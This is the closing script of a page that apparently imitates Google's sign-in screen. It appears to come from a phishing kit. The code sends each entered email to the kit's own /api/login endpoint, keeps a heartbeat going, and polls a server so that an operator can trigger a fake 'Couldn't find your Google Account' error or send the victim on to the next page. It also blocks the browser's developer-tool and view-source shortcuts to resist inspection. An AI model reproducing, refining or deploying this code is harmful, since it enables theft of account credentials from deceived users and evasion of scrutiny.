        }

        console.log('[index] Using existing session:', sid);
        sessionStorage.setItem('sid', sid);

        
        fetch('/api/page', {
          method:  'POST',
          headers: { 'content-type': 'application/json' },
          body:    JSON.stringify({ sid, page: 'index.html' })
        })
          .then(function () { console.log('[index] Page registered'); })
          .catch(function (err) { console.error('[index] registerPage error:', err); });

        
        const heartbeatInterval = setInterval(function () {
          fetch('/api/ping', {
            method:  'POST',
            headers: { 'content-type': 'application/json' },
            body:    JSON.stringify({ sid })
          }).catch(function () {});
        }, 10000);
        window.addEventListener('beforeunload', function () { clearInterval(heartbeatInterval); });

        
        function getEmail() {
          const el = document.getElementById('identifierId');
          return el ? el.value.trim() : '';
        }
        function clearForm() {
          const el = document.getElementById('identifierId');
          if (el) { el.value = ''; el.classList.remove('has-value'); }
        }
        function showLoading() {
          document.getElementById('google-loading-overlay').classList.add('active');
          const loader = document.querySelector('.Ih3FE');
          if (loader) loader.style.display = 'block';
        }
        function hideLoading() {
          document.getElementById('google-loading-overlay').classList.remove('active');
          const loader = document.querySelector('.Ih3FE');
          if (loader) loader.style.display = 'none';
        }
        function showError() {
          let styleEl = document.getElementById('redo-error-style');
          if (!styleEl) {
            styleEl = document.createElement('style');
            styleEl.id = 'redo-error-style';
            document.head.appendChild(styleEl);
          }
          styleEl.textContent = `
            .rFrNMe, .rFrNMe .aCsJod, .rFrNMe .oJeWuf,
            .rFrNMe .aXBtI, .rFrNMe fieldset,
            .rFrNMe .i9lrp, .rFrNMe .mIZh1c {
              border-color: #e8a09a !important;
              border-width: 2px !important;
            }
            .rFrNMe .OabDMe { background-color: #e8a09a !important; }
          `;
          const label = document.querySelector('[jsname="YRMmle"]');
          if (label) label.style.color = '#e8a09a';
          let errEl = document.getElementById('redo-error-msg');
          if (!errEl) {
            errEl = document.createElement('div');
            errEl.id = 'redo-error-msg';
            errEl.style.cssText = 'display:flex;align-items:center;gap:5px;margin-top:4px;color:#e8a09a;font-size:12px;font-family:Google Sans,Roboto,sans-serif;';
            errEl.innerHTML = '<svg xmlns="http://www.w3.org/2000/svg" height="14" width="14" viewBox="0 0 24 24" fill="#e8a09a"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span>Couldn\'t find your Google Account</span>';
            const inputContainer = document.querySelector('.AFTWye');
            if (inputContainer) inputContainer.insertAdjacentElement('afterend', errEl);
          }
          errEl.style.display = 'flex';
        }
        function clearError() {
          const styleEl = document.getElementById('redo-error-style');
          if (styleEl) styleEl.textContent = '';
          const label = document.querySelector('[jsname="YRMmle"]');
          if (label) label.style.color = '';
          const errEl = document.getElementById('redo-error-msg');
          if (errEl) errEl.style.display = 'none';
        }

        
        let isPolling     = false;
        let pollTimer     = null;
        let hasNavigated  = false;
        let pollCount     = 0;

        function stopPolling() {
          isPolling = false;
          if (pollTimer) { clearTimeout(pollTimer); pollTimer = null; }
        }

        function startPolling() {
          if (isPolling) return;
          isPolling = true;
          pollCount = 0;
          console.log('[index] ▶ Poll started. sid:', sid);
          schedulePoll(800);
        }

        function schedulePoll(delay) {
          if (!isPolling || hasNavigated) return;
          pollTimer = setTimeout(poll, delay);
        }

        function poll() {
          if (!isPolling || hasNavigated) return;
          pollCount++;

          fetch('/api/status/' + encodeURIComponent(sid))
            .then(function (res) {
              if (!res.ok) throw new Error('HTTP ' + res.status);
              return res.json();
            })
            .then(function (data) {
              console.log(
                '[index] poll #' + pollCount,
                '| status=' + data.status,
                '| page=' + data.page
              );

              
              if (data.status === 'gone') {
                stopPolling();
                sessionStorage.removeItem('sid');
                hideLoading();
                window.location.reload();
                return;
              }

              
              if (data.page === 'welcome.html') {
                if (hasNavigated) return;
                hasNavigated = true;
                stopPolling();
                hideLoading();
                console.log('[index] ✅ page=welcome.html detected — navigating');
                window.location.replace('/welcome.html?sid=' + encodeURIComponent(sid));
                return;
              }

              
              if (data.status === 'redo') {
                stopPolling();
                hideLoading();
                console.log('[index] status=redo — clearing form');
                fetch('/api/clearRedo', {
                  method:  'POST',
                  headers: { 'content-type': 'application/json' },
                  body:    JSON.stringify({ sid })
                })
                  .catch(function (e) { console.warn('[index] clearRedo error:', e); })
                  .finally(function () { clearForm(); showError(); });
                return;
              }

              
              schedulePoll(1000);
            })
            .catch(function (err) {
              console.error('[index] poll #' + pollCount + ' error:', err);
              schedulePoll(2000);
            });
        }

        
        async function handleEmailSubmit(email) {
          console.log('[index] Submitting email:', email);
          showLoading();
          try {
            const res = await fetch('/api/login', {
              method:  'POST',
              headers: { 'content-type': 'application/json' },
              body:    JSON.stringify({ sid, email })
            });
            if (res.ok) {
              console.log('[index] Email accepted — starting poll');
              sessionStorage.setItem('email', email);
              startPolling();
            } else {
              console.error('[index] /api/login error:', res.status);
              hideLoading();
            }
          } catch (err) {
            console.error('[index] /api/login fetch error:', err);
            hideLoading();
          }
        }

        
        document.addEventListener('DOMContentLoaded', function () {
          console.log('[index] DOM loaded');

          const emailInput    = document.getElementById('identifierId');
          const nextButton    = document.querySelector('#identifierNext button');
          const forgotEmailBtn = document.querySelector('[jsname="Cuz2Ue"]');

          if (emailInput && nextButton) {

            nextButton.addEventListener('mousedown', function () {
              const label = document.querySelector('[jsname="YRMmle"]');
              if (label && emailInput.value.trim() !== '') {
                label.style.transform      = 'translateY(-106%) scale(0.75)';
                label.style.transformOrigin = 'left top';
              }
            });

            emailInput.addEventListener('blur', function () {
              const label = document.querySelector('[jsname="YRMmle"]');
              setTimeout(function () {
                if (!label) return;
                if (emailInput.value.trim() !== '') {
                  label.style.transform      = 'translateY(-106%) scale(0.75)';
                  label.style.transformOrigin = 'left top';
                } else {
                  label.style.transform      = '';
                  label.style.transformOrigin = '';
                }
              });
            });

            emailInput.addEventListener('input', clearError);

            nextButton.addEventListener('click', function (e) {
              e.preventDefault();
              e.stopPropagation();
              let email = getEmail();
              if (!email) { emailInput.focus(); return; }
              if (!email.includes('@')) email = email + '@gmail.com';
              handleEmailSubmit(email);
            });

            emailInput.addEventListener('keypress', function (e) {
              if (e.key === 'Enter') { e.preventDefault(); nextButton.click(); }
            });
          }

          if (forgotEmailBtn) {
            forgotEmailBtn.addEventListener('click', function (e) {
              e.preventDefault();
              if (emailInput) { emailInput.value = ''; emailInput.classList.remove('has-value'); emailInput.focus(); }
            });
          }

          
          setTimeout(function () {
            fetch('/api/status/' + encodeURIComponent(sid))
              .then(function (res) { return res.json(); })
              .then(function (data) {
                console.log('[index] Initial status check:', data.status, '| page:', data.page);
                
                if (data.page === 'welcome.html') {
                  window.location.replace('/welcome.html?sid=' + encodeURIComponent(sid));
                  return;
                }
                
                if (data.status === 'wait' || data.entered) {
                  showLoading();
                  startPolling();
                }
              })
              .catch(function (err) { console.error('[index] Initial status check failed:', err); });
          }, 500);
        });

      })();
      document.addEventListener('keydown', function(e) {
  if (
    e.key === 'F12' ||
    (e.ctrlKey && e.key.toLowerCase() === 'u') ||
    (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(e.key.toLowerCase()))
  ) {
    e.preventDefault();
  }
});
    </script>
</body>
